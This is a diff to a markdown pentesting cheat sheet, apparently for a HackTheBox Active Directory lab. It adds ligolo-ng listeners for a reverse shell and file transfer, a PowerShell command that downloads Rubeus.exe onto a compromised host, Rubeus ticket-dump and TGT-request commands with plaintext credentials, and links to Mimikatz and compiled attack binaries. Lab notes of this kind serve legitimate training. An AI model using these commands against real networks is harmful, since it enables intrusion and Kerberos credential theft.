@@ -209,8 +209,28 @@ sudo ./proxy -selfcert -laddr 0.0.0.0:443 -v
 session
 start
 sudo ip route add 192.168.110.0/24 dev ligolo
+
+listener_add --addr 0.0.0.0:1234 --to 0.0.0.0:4444 (open port on DMZ machine for reverse shell)
+listener_add --addr 0.0.0.0:1235 --to 0.0.0.0:8000 (open port on DMZ machine for file transfer)
+
+powershell -Command "Invoke-WebRequest -Uri 'http://192.168.110.51:1235/Rubeus.exe' -OutFile 'Rubeus.exe'"
 ```
+**Additional Resources**
+  - [Ligolo Guide for pivoting](https://systemweakness.com/pivoting-for-newbies-with-ligolo-ng-82f13040aa39)
+  - [Advanced pivoting guide](https://arth0s.medium.com/ligolo-ng-pivoting-reverse-shells-and-file-transfers-6bfb54593fa5)
+
+**[Rubeus for Windows](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries)**
+
+```
+Rubeus.exe dump /luci:0x599ac7 /service:CIFS/dc.painters.htb /nowrap /outfile [dump to kirbi files]
+Rubeus.exe asktgt /user:blake /password:Password123! /domain:PAINTERS.HTB /dc:192.168.110.55 [request for TGT using credentials]
+```
+
+**[Mimikatz](https://github.com/gentilkiwi/mimikatz/releases)**
+
+**[Wordlists](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/hash-cracking/#hashcat-install)**
 
 ## Resources
  - [The Hacker Recipes](https://www.thehacker.recipes/)
  - [Active Directory Exploitation Cheat Sheet](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet)
+ - [InternalAllTheThings](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/)
